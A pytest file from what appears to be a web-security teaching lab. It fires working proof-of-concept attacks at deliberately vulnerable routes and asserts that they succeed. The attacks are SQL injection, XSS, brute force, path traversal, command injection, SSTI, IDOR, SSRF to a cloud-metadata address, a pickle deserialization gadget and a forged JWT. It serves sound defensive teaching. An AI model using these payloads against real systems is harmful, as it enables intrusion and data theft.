"""Proof-of-exploit tests against the naive ``/vulnerable`` routes.

Each test fires a real attack payload and asserts that it *succeeds*. This is half of
the project's thesis: the naive code is genuinely exploitable. The matching
``test_secure.py`` proves the hardened twin blocks the very same payload.

All tests run against ``naive_client`` (Blue Team off), so nothing stands between the
payload and the vulnerable code.
"""

from __future__ import annotations

import base64
import os
import pickle  # noqa: S403 - building an exploit payload is the point
import tempfile

import jwt
import pytest

pytestmark = pytest.mark.vulnerable


def test_sql_injection_returns_all_rows(naive_client):
    # `id=1 OR 1=1` makes the WHERE clause always true -> the whole users table.
    resp = naive_client.get("/vulnerable/sql", query_string={"id": "1 OR 1=1"})
    assert resp.status_code == 200
    results = resp.get_json()["results"]
    assert len(results) == 3  # all three seeded users leaked


def test_xss_reflects_raw_script(naive_client):
    payload = "<script>alert(1)</script>"
    resp = naive_client.get("/vulnerable/xss", query_string={"name": payload})
    assert resp.status_code == 200
    # The raw <script> tag survives into the response -> it would execute in a browser.
    assert "<script>" in resp.get_data(as_text=True)


def test_brute_force_has_no_rate_limit(naive_client):
    # Ten wrong guesses in a row: all return 401, none are throttled with 429.
    for _ in range(10):
        resp = naive_client.get(
            "/vulnerable/login", query_string={"username": "admin", "password": "errado"}
        )
        assert resp.status_code == 401  # never 429 -> nothing slows the attacker down

    # And the correct password is accepted, confirming the wordlist would eventually win.
    ok = naive_client.get(
        "/vulnerable/login", query_string={"username": "admin", "password": "admin123"}
    )
    assert ok.status_code == 200
    assert ok.get_json()["status"] == "ok"


def test_path_traversal_leaks_source(naive_client):
    # `../../config.py` escapes data/files/ up to the package root and reads the source.
    resp = naive_client.get("/vulnerable/file", query_string={"name": "../../config.py"})
    assert resp.status_code == 200
    assert "BLUE_TEAM_ENABLED" in resp.get_json()["content"]


def test_command_injection_runs_injected_command(naive_client):
    # OS-aware payload: the shell metacharacter differs between cmd.exe and POSIX sh.
    host = "127.0.0.1 & echo INJECTED" if os.name == "nt" else "127.0.0.1; echo INJECTED"
    resp = naive_client.get("/vulnerable/ping", query_string={"host": host})
    assert resp.status_code == 200
    # The injected `echo` ran: its output proves arbitrary command execution.
    assert "INJECTED" in resp.get_json()["output"]


def test_ssti_evaluates_expression(naive_client):
    resp = naive_client.get("/vulnerable/ssti", query_string={"name": "{{7*7}}"})
    assert resp.status_code == 200
    # 7*7 was evaluated as template code -> 49 in the output.
    assert "49" in resp.get_data(as_text=True)


def test_idor_leaks_other_users_note(naive_client):
    # No auth at all, yet we read the admin's (id=1) private recovery note.
    resp = naive_client.get("/vulnerable/account/1")
    assert resp.status_code == 200
    assert "recovery" in resp.get_json()["private_note"].lower()


def test_ssrf_fetches_internal_address(naive_client, monkeypatch):
    # Avoid touching the network: capture the URL the vulnerable route would request.
    captured = {}

    class _FakeResponse:
        status_code = 200
        text = "fake"

    def _fake_get(url, *args, **kwargs):
        captured["url"] = url
        return _FakeResponse()

    monkeypatch.setattr("lab.vulnerable.ssrf.requests.get", _fake_get)

    internal = "http://169.254.169.254/"
    resp = naive_client.get("/vulnerable/fetch", query_string={"url": internal})
    assert resp.status_code == 200
    # No allowlist / IP filtering: the cloud-metadata address was fetched as-is.
    assert captured["url"] == internal


def test_deserialization_executes_code(naive_client):
    marker_dir = os.path.join(tempfile.gettempdir(), "lab_pickle_rce_marker")
    # Make sure we start clean so the assertion proves *this* request created it.
    if os.path.isdir(marker_dir):
        os.rmdir(marker_dir)

    class _Exploit:
        def __reduce__(self):
            # os.makedirs is importable and picklable; it runs on unpickling.
            return (os.makedirs, (marker_dir,))

    payload = base64.b64encode(pickle.dumps(_Exploit())).decode("ascii")
    try:
        resp = naive_client.get("/vulnerable/deserialize", query_string={"data": payload})
        assert resp.status_code == 200
        # The directory only exists if pickle.loads ran our __reduce__ gadget.
        assert os.path.isdir(marker_dir)
    finally:
        if os.path.isdir(marker_dir):
            os.rmdir(marker_dir)


def test_jwt_accepts_forged_token(naive_client):
    # Signed with the WRONG key -> the naive route never checks the signature.
    forged = jwt.encode({"role": "admin"}, "wrong-key", algorithm="HS256")
    resp = naive_client.get("/vulnerable/jwt/admin", query_string={"token": forged})
    assert resp.status_code == 200  # admin granted on an unverified, forged token
    assert resp.get_json()["status"] == "ok"
